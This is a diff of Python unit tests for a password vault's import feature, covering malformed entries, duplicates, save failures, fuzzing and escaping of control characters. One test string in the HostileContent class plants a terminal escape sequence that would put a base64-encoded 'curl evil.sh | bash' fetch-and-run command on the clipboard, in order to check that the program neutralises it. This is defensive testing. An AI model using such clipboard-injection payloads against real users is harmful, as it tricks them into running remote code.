@@ -104,11 +104,17 @@ class ImportCase(unittest.TestCase):
         answer = responder(filename, **kw)
         if db is None:
             db = I.loadDatabase(self.key)
+        def reraise(exc):
+            # The import screens catch every exception and print its name. In
+            # tests an unexpected exception must fail the test, not pass as a
+            # clean rejection.
+            raise exc
         with mock.patch.object(D, "timeoutInput", answer), \
              mock.patch.object(D, "timeout_getpass", answer), \
              mock.patch("builtins.input", answer), \
              mock.patch.object(D, "clear_screen", quiet), \
              mock.patch.object(D, "displayHeader", quiet), \
+             mock.patch.object(D, "safe_error", reraise), \
              contextlib.redirect_stdout(out):
             result = func(self.key, db)
         return result, out.getvalue(), db
@@ -204,8 +210,63 @@ class ReImport(ImportCase):
         self.assertEqual(db, self.vault())
 
 
+class ReviewFollowUps(ImportCase):
+    def test_lone_surrogate_skips_only_that_entry(self):
+        self.fresh_vault()
+        Path("p.json").write_text(json.dumps(export_doc("profiles", {
+            "1": PROFILES["1"], "2": {"domain": "bad\ud800", "password": "p"}})), encoding="utf-8")
+        _, out, _ = self.run_import(D.importProfiles, "p.json")
+        self.assertEqual(len(self.vault()), 1)
+        self.assertIn("'domain' is not valid text", out)
+
+    def test_favourite_only_difference_is_reported(self):
+        self.fresh_vault()
+        self.write("n.json", export_doc("notes", NOTES))
+        self.run_import(D.importNotes, "n.json")
+        starred = copy.deepcopy(NOTES)
+        starred["1"]["favorite"] = True
+        self.write("n.json", export_doc("notes", starred))
+        _, out, _ = self.run_import(D.importNotes, "n.json")
+        self.assertEqual(len(self.vault()), 2)
+        self.assertIn("1 of those differ only in the favourite star", out)
+
+    def test_same_login_inside_one_file_is_not_called_existing(self):
+        self.fresh_vault()
+        other = dict(PROFILES["1"], password="other-pw")
+        self.write("p.json", export_doc("profiles", {"a": PROFILES["1"], "b": other}))
+        _, out, _ = self.run_import(D.importProfiles, "p.json")
+        self.assertEqual(len(self.vault()), 2)
+        self.assertNotIn("same site and login", out)
+
+    def test_timeout_after_failed_save_logs_out(self):
+        self.fresh_vault()
+        self.write("p.json", export_doc("profiles", PROFILES))
+        answer = responder("p.json")
+
+        def timed(prompt, *a, **k):
+            return "\x00TIMEOUT" if "Press 'enter'" in prompt else answer(prompt, *a, **k)
+        with mock.patch.object(D, "timeoutGlobalCode", "\x00TIMEOUT"), \
+             mock.patch.object(D, "saveDatabase", return_value=False), \
+             mock.patch.object(D, "timeoutInput", timed), \
+             mock.patch.object(D, "clear_screen", quiet), mock.patch.object(D, "displayHeader", quiet), \
+             contextlib.redirect_stdout(io.StringIO()):
+            self.assertIs(D.importProfiles(self.key, self.vault()), True)
+
+    def test_interrupted_save_leaves_the_old_vault(self):
+        self.fresh_vault()
+        before = Path("Bunker.mmf").read_bytes()
+        self.write("p.json", export_doc("profiles", PROFILES))
+        db = self.vault()
+        with mock.patch("os.replace", side_effect=OSError(28, "No space left on device")):
+            _, out, db = self.run_import(D.importProfiles, "p.json", db=db)
+        self.assertEqual(Path("Bunker.mmf").read_bytes(), before)
+        self.assertEqual(db, {})
+        self.assertIn("Nothing was imported", out)
+        self.assertEqual([f for f in os.listdir(".") if f.endswith(".tmp")], [])
+
+
 class HostileContent(ImportCase):
-    EVIL = "evil.com\x1b]52;c;Y3VybCBldmlsLnNoIHwgYmFzaA==\x07\x1b[2J‮"
+    EVIL = "evil.com\x1b]52;c;Y3VybCBldmlsLnNoIHwgYmFzaA==\x07\x1b[2J\u202e"
 
     def test_control_characters_are_shown_escaped_and_stored_exactly(self):
         self.fresh_vault()
@@ -214,7 +275,7 @@ class HostileContent(ImportCase):
         _, out, _ = self.run_import(D.importProfiles, "p.json", show_passwords="y")
         self.assertNotIn("\x1b]", out)
         self.assertNotIn("\x1b[2J", out)
-        self.assertNotIn("‮", out)
+        self.assertNotIn("\u202e", out)
         self.assertIn("\\x1b]52", out)
         self.assertIn("terminal control characters", out)
         stored = self.decrypted("profiles")
@@ -342,18 +403,21 @@ class FuzzImport(ImportCase):
         for k, v in base_db.items():
             self.assertEqual(after.get(k), v, "an existing entry was changed")
         added = [after[k] for k in after.keys() - base_db.keys()]
+        fields = ("domain", "email", "username", "password") if kind == "profiles" else ("title", "content")
+        known = {tuple(D.decode_and_decrypt(f, e, self.key) for f in fields) for e in base_db.values()}
         for entry in added:
-            fields = ("domain", "email", "username", "password") if kind == "profiles" else ("title", "content")
-            for f in fields:
-                self.assertIsInstance(D.decode_and_decrypt(f, entry, self.key), str)
+            values = tuple(D.decode_and_decrypt(f, entry, self.key) for f in fields)
+            for v in values:
+                self.assertIsInstance(v, str)
             self.assertIsInstance(entry["favorite"], bool)
+            if kind == "profiles":
+                self.assertNotIn(values, known, "an entry already in the vault was added again")
         return len(added)
 
     def _fuzz(self, func, kind, entries, seed):
         self.fresh_vault()
         rng = random.Random(seed)
         good = json.dumps(export_doc(kind, entries)).encode()
-        added_any = 0
         # Control round: the unmodified file really imports.
         Path("f.json").write_bytes(good)
         self.assertEqual(self.check_property(func, kind, "f.json", {}), len(entries))
@@ -366,11 +430,10 @@ class FuzzImport(ImportCase):
                 doc = structural_mutation(rng, doc, kind)
                 Path("f.json").write_text(json.dumps(doc), encoding="utf-8")
             self.fresh_vault()
-            added_any += self.check_property(func, kind, "f.json", {})
+            self.check_property(func, kind, "f.json", {})
             # Against a vault that already holds the originals, a mutated file never
             # re-adds them.
             self.check_property(func, kind, "f.json", base)
-        return added_any
 
     def test_fuzz_profiles(self):
         self._fuzz(D.importProfiles, "profiles", PROFILES, SEED)
@@ -407,9 +470,15 @@ class FuzzImport(ImportCase):
 
 class Printable(unittest.TestCase):
     def test_escapes_every_control_class(self):
-        for ch in ("\x00", "\x07", "\x1b", "\x7f", "\x9b", "\x9d", "‮", "⁦"):
+        for ch in ("\x00", "\x07", "\x1b", "\x7f", "\x9b", "\x9d", "\u202e", "\u2066"):
             self.assertNotIn(ch, F.printable(f"a{ch}b"))
             self.assertTrue(F.has_controls(f"a{ch}b"))
+
+    def test_invisible_characters_are_made_visible(self):
+        for ch in ("\u200b", "\ufeff", "\u2028", "\u2029", "\u00ad"):
+            shown = F.printable(f"pay{ch}pal")
+            self.assertNotIn(ch, shown)
+            self.assertIn("\\", shown)  # shown as \u.... or \x..
 
     def test_plain_text_unchanged(self):
         for text in ("example.com", "pässwörd ✓ 密码", "a b"):
